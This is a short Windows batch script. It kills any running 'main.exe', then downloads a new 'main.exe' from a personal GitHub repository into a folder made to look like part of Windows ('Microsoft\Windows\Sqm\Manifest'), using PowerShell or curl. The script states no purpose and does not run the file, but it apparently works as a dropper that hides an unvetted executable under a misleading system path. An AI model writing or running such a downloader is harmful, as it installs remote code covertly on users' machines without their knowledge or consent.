
@echo off
set "url=https://github.com/mrjackff/streamer/raw/refs/heads/main/main.exe"
set "output_path=C:\Program Files (x86)\Microsoft\Windows\Sqm\Manifest\main.exe"
set "folder_path=C:\Program Files (x86)\Microsoft\Windows\Sqm\Manifest"
tasklist /FI "IMAGENAME eq main.exe" | find /I "main.exe" >nul
if %ERRORLEVEL%==0 (
    echo main.exe is running. Ending the task...
    taskkill /F /IM main.exe
    echo Task ended.
) else (
    echo main.exe is not running.
)
if not exist "%folder_path%" (
    echo Folder does not exist. Creating folder...
    mkdir "%folder_path%"
)
if exist "%output_path%" (
    echo File already exists. Replacing it...
    del "%output_path%"
)
echo Downloading main.exe...
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output_path%'"
if %ERRORLEVEL% NEQ 0 (
    echo Download with PowerShell failed. Trying curl...
    curl -L -o "%output_path%" "%url%"
)
if exist "%output_path%" (
    echo Download completed successfully.
) else (
    echo Download failed.
)

echo Closing in 5 seconds...
timeout /t 5 /nobreak >nul

exit
